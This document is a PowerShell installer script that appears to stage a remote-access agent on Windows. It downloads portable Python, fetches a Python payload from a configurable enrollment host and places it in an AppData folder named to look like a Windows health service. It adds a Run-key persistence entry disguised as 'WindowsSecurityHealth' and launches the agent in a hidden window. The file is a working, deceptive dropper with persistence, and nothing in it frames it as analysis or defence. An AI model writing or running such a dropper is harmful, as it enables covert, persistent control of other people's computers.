$INIT_URL   = "https://init-yourid.yourdomain.com"
$ENROLL_KEY = "your-enroll-key-here"
$AGENT_DIR  = "$env:APPDATA\WindowsHealthSvc"
$PY_DIR     = "$AGENT_DIR\py"
$SVC_PATH   = "$AGENT_DIR\svc.py"
$PY_ZIP_URL = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip"
$REG_KEY    = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$REG_NAME   = "WindowsSecurityHealth"

New-Item -ItemType Directory -Force -Path $AGENT_DIR | Out-Null

$py_exe = $null
foreach ($cmd in @("python", "python3")) {
    try {
        $out = & $cmd --version 2>&1
        if ($LASTEXITCODE -eq 0) { $py_exe = (Get-Command $cmd).Source; break }
    } catch {}
}

if (-not $py_exe) {
    New-Item -ItemType Directory -Force -Path $PY_DIR | Out-Null
    $py_exe = "$PY_DIR\python.exe"
    if (-not (Test-Path $py_exe)) {
        Write-Host "[*] Downloading portable Python..."
        $zip = "$env:TEMP\py_embed.zip"
        (New-Object System.Net.WebClient).DownloadFile($PY_ZIP_URL, $zip)
        Expand-Archive -Path $zip -DestinationPath $PY_DIR -Force
        Remove-Item $zip -Force
        Write-Host "[+] Python ready"
    }
}

Write-Host "[*] Downloading agent..."
(New-Object System.Net.WebClient).DownloadFile("$INIT_URL/svc.py?enroll=$ENROLL_KEY", $SVC_PATH)
Write-Host "[+] Saved to $SVC_PATH"

$reg_value = "`"$py_exe`" `"$SVC_PATH`""
Set-ItemProperty -Path $REG_KEY -Name $REG_NAME -Value $reg_value
Write-Host "[+] Persistence: HKCU Run > $REG_NAME"

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName        = $py_exe
$psi.Arguments       = "`"$SVC_PATH`""
$psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow  = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null
Write-Host "[+] Agent started"
Write-Host "[+] Install complete"
